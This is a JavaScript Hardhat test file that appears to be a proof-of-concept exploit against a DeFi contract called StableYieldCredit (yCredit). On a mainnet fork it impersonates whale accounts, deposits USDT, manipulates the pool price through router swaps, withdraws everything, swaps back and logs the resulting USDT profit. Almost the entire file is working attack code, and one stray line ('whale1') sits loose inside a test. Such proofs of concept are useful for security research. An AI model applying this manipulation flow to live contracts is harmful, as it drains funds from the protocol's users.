const { expect } = require("chai");

const ROUTER = "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F"
const whale1 = "0x1062a747393198f70F71ec65A582423Dba7E5Ab3"
const whale2 = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e"
const amount = ethers.utils.parseUnits("100000", 6)

const overrides = {
  gasPrice: ethers.utils.parseEther("0")
}

describe("yCredit", function() {

  let yCredit;
  let usdt;
  let router;
  let balance;
  let initialUsdt;

  it("setup", async function() {
    
    const factory = await ethers.getContractFactory("StableYieldCredit");
    yCredit = await factory.deploy();
    usdt = await ethers.getContractAt("IERC20", "0xdAC17F958D2ee523a2206206994597C13D831ec7")
    router = await ethers.getContractAt("Router", ROUTER);
    initialUsdt = await usdt.balanceOf(whale1)
    await hre.network.provider.request({
      method: "hardhat_impersonateAccount",
      params: [whale2]}
    )
  
    let signer = await ethers.provider.getSigner(whale2);
    yCredit = yCredit.connect(signer)
    usdt = usdt.connect(signer);

    // fill pool
    await usdt.approve(yCredit.address, ethers.utils.parseUnits("100000", 6), overrides);
    await yCredit.deposit(usdt.address, ethers.utils.parseUnits("100000", 6), overrides);
    await hre.network.provider.request({
        method: "hardhat_impersonateAccount",
        params: [whale1]}
      )
    
       signer = await ethers.provider.getSigner(whale1);
      yCredit = yCredit.connect(signer)
      usdt = usdt.connect(signer);
      router = router.connect(signer);
  })

  it("deposit", async function() {
    // deposit amount
    await usdt.approve(yCredit.address, amount, overrides);
    await yCredit.deposit(usdt.address, amount, overrides);
    // get ycredit balance
    balance = await yCredit.balanceOf(whale1);

  })

  it("swap usdt to ycredit", async function() {
    // crash price
    await usdt.approve(router.address, amount, overrides);
    await router.swapExactTokensForTokens(amount, 0, [usdt.address, yCredit.address], whale1, 10e9, overrides);

  })

  it("withdraw all", async function() {
    balance = await yCredit.balanceOf(whale1);
whale1
    await yCredit.withdrawAll(usdt.address, overrides);

    balance = await yCredit.balanceOf(whale1);

  })


  it("swap to usdt", async function() {
    // swap back to ycredit
    balance = await yCredit.balanceOf(whale1);
    await yCredit.approve(router.address, balance, overrides);
    await router.swapExactTokensForTokens(balance, 0, [yCredit.address, usdt.address], whale1, 10e9, overrides);
    balance = await yCredit.balanceOf(whale1);
    const finalUsdt = await usdt.balanceOf(whale1);
    const profit = finalUsdt.sub(initialUsdt)
    console.log('Profit', ethers.utils.formatUnits(profit, 6), "USDT")
  })

});
